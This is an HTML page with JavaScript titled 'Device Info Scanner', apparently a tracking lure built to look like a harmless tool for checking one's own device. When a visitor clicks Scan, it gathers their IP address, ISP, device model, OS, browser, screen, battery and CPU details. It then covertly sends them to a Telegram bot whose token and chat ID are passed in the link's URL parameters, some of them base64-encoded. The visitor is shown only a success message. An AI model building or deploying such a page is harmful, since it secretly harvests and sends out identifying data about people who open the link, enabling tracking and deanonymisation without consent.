<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Device Scanner</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
        body{background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px;}
        .container{max-width:480px;width:100%;background:#111;border:1px solid #00ff41;border-radius:20px;padding:24px 20px;box-shadow:0 0 40px rgba(0,255,65,0.05);}
        .header{text-align:center;margin-bottom:16px;}
        .header .icon{font-size:2.8rem;display:block;}
        .header h1{font-size:1.5rem;color:#00ff41;font-weight:700;}
        .header p{color:#7a8a6a;font-size:0.8rem;margin-top:2px;}
        .status-box{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:12px;margin-bottom:16px;text-align:center;}
        .status-box .status-icon{font-size:2rem;}
        .status-box .status-text{font-size:0.9rem;color:#b0d0b0;font-weight:500;}
        .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px;}
        .info-item{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:12px;padding:10px 8px;text-align:center;}
        .info-item .label{font-size:0.55rem;color:#7a8a6a;text-transform:uppercase;letter-spacing:0.5px;}
        .info-item .value{font-size:0.75rem;color:#e0f0e0;font-weight:600;margin-top:2px;word-break:break-all;}
        .info-item .value.ip{font-size:0.65rem;}
        .info-item.full{grid-column:1/-1;}
        .btn{width:100%;padding:14px;background:#00ff41;color:#000;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;transition:0.2s;margin:12px 0 4px;}
        .btn:hover{background:#00cc33;box-shadow:0 0 20px rgba(0,255,65,0.2);}
        .btn:disabled{opacity:0.5;cursor:not-allowed;}
        .footer{text-align:center;font-size:0.6rem;color:#4a5a4a;margin-top:16px;border-top:1px solid #1a2a1a;padding-top:12px;}
        .footer i{color:#00ff41;}
        .toast{background:#1a2a1a;border:1px solid #00ff41;color:#d0e8d0;padding:8px 16px;border-radius:30px;font-size:0.7rem;margin-top:8px;text-align:center;display:none;}
        .toast.show{display:block;}
        @media(max-width:480px){.container{padding:16px 14px;}.info-item .value{font-size:0.7rem;}}
    </style>
</head>
<body>
<div class="container">

    <div class="header">
        <span class="icon"></span>
        <h1>Device Info Scanner</h1>
        <p>Scan your device specifications</p>
    </div>

    <div class="status-box" id="statusBox">
        <span class="status-icon" id="statusIcon"></span>
        <div class="status-text" id="statusText">Initializing...</div>
    </div>

    <div class="info-grid" id="infoGrid">
        <div class="info-item">
            <div class="label"> IP Address</div>
            <div class="value ip" id="ipVal">-</div>
        </div>
        <div class="info-item">
            <div class="label"> ISP</div>
            <div class="value" id="ispVal">-</div>
        </div>
        <div class="info-item">
            <div class="label"> Device</div>
            <div class="value" id="modelVal">-</div>
        </div>
        <div class="info-item">
            <div class="label"> OS</div>
            <div class="value" id="osVal">-</div>
        </div>
        <div class="info-item">
            <div class="label"> Browser</div>
            <div class="value" id="browserVal">-</div>
        </div>
        <div class="info-item">
            <div class="label"> Screen</div>
            <div class="value" id="screenVal">-</div>
        </div>
        <div class="info-item full">
            <div class="label"> Battery</div>
            <div class="value" id="batteryVal">-</div>
        </div>
        <div class="info-item full">
            <div class="label"> Network</div>
            <div class="value" id="networkVal">-</div>
        </div>
        <div class="info-item full">
            <div class="label"> CPU Cores</div>
            <div class="value" id="cpuVal">-</div>
        </div>
    </div>

    <button class="btn" id="scanBtn"> SCAN DEVICE</button>

    <div class="toast" id="toastMsg"> You have successfully scanned the device.</div>

    <div class="footer">
        <i class="fas fa-code"></i> Device Scanner Tools - Developer Arif
    </div>
</div>

<script>
    // ======   ======
    function getCreds() {
        const params = new URLSearchParams(window.location.search);
        let token = params.get('tg_token');
        let chatId = params.get('tg_chat');
        
        if (!token || !chatId) {
            const encodedData = params.get('tg_data');
            if (encodedData) {
                try {
                    const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
                    token = decoded.token;
                    chatId = decoded.chatId;
                } catch(e) {}
            }
        }
        
        if (!token) token = localStorage.getItem('tg_bot_token');
        if (!chatId) chatId = localStorage.getItem('tg_chat_id');
        
        console.log(' Token:', token ? ' Present' : ' Missing');
        console.log(' Chat ID:', chatId ? ' Present' : ' Missing');
        
        return { token, chatId };
    }

    // ======   (    Markdown ) ======
    function sendToTelegram(info) {
        const { token, chatId } = getCreds();
        if (!token || !chatId) {
            console.warn(' Telegram not configured.');
            showToast(' Telegram not configured!');
            return;
        }
        const time = new Date().toLocaleString();
        const msg = ` Cyber Tools Activity
 ${time}
 Tool:  Device Scanner
 Action: Device info captured

 IP: ${info.ip}
 ISP: ${info.isp}
 Device: ${info.model}
 OS: ${info.os}
 Browser: ${info.browser}
 Screen: ${info.screen}
 Battery: ${info.battery}
 Network: ${info.network}
 CPU Cores: ${info.cpu}`;

        console.log(' Sending to Telegram (plain text)...');
        
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                console.log(' Telegram sent');
                showToast(' You have successfully scanned the device.');
            } else {
                console.warn('Telegram error:', data.description);
                showToast(' Telegram error: ' + data.description);
            }
        })
        .catch(err => {
            console.warn('Telegram send failed:', err);
            showToast(' Network error');
        });
    }

    // ======  ======
    function showToast(msg) {
        const toast = document.getElementById('toastMsg');
        toast.textContent = msg;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 4000);
    }

    // ======   ======
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

        let browser = 'Unknown';
        if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';

        let model = 'Generic Device';
        if (/iPhone/i.test(ua)) model = 'Apple iPhone';
        else if (/iPad/i.test(ua)) model = 'Apple iPad';
        else if (/Android/i.test(ua)) {
            const match = ua.match(/Android\s([0-9\.]+);\s([^;\)]+)/);
            model = match && match[2] ? match[2] : 'Android Device';
        } else if (/Windows/i.test(ua)) model = 'Windows PC';
        else if (/Macintosh/i.test(ua)) model = 'Apple Mac';

        const screen = `${window.screen.width}${window.screen.height}`;
        const network = navigator.onLine ? 'Online' : 'Offline';
        const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : 'N/A';

        return { os, browser, model, screen, network, cpu };
    }

    // ====== IP  ISP ======
    async function fetchIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip || 'N/A';
        } catch {
            return 'N/A';
        }
    }

    async function fetchISP() {
        try {
            const res = await fetch('https://ipapi.co/org/');
            if (res.ok) {
                const text = await res.text();
                return text.trim() || 'Unknown ISP';
            }
            return 'Unknown ISP';
        } catch {
            return 'Unknown ISP';
        }
    }

    // ======  ======
    async function getBattery() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                const level = Math.floor(battery.level * 100) + '%';
                const charging = battery.charging ? ' (Charging)' : ' (Discharging)';
                return level + charging;
            }
            return 'Unavailable';
        } catch {
            return 'Unavailable';
        }
    }

    // ======  ======
    async function startScan() {
        const btn = document.getElementById('scanBtn');
        const statusIcon = document.getElementById('statusIcon');
        const statusText = document.getElementById('statusText');
        
        btn.disabled = true;
        statusIcon.textContent = '';
        statusText.textContent = 'Scanning...';

        const ip = await fetchIP();
        const isp = await fetchISP();
        const info = getDeviceInfo();
        const battery = await getBattery();

        document.getElementById('ipVal').textContent = ip;
        document.getElementById('ispVal').textContent = isp;
        document.getElementById('modelVal').textContent = info.model;
        document.getElementById('osVal').textContent = info.os;
        document.getElementById('browserVal').textContent = info.browser;
        document.getElementById('screenVal').textContent = info.screen;
        document.getElementById('batteryVal').textContent = battery;
        document.getElementById('networkVal').textContent = info.network;
        document.getElementById('networkVal').style.color = info.network === 'Online' ? '#00ff41' : '#ff4444';
        document.getElementById('cpuVal').textContent = info.cpu;

        statusIcon.textContent = '';
        statusText.textContent = 'Scan complete!';
        btn.disabled = false;

        const fullInfo = { ip, isp, model: info.model, os: info.os, browser: info.browser, screen: info.screen, battery, network: info.network, cpu: info.cpu };
        sendToTelegram(fullInfo);
    }

    // ======   ======
    document.addEventListener('DOMContentLoaded', function() {
        const { token, chatId } = getCreds();
        if (token && chatId) {
            document.getElementById('statusText').textContent = 'Ready to scan';
            document.getElementById('statusIcon').textContent = '';
        } else {
            document.getElementById('statusText').textContent = ' Telegram not set';
            document.getElementById('statusIcon').textContent = '';
        }
        document.getElementById('scanBtn').addEventListener('click', startScan);
    });
</script>
</body>
</html>
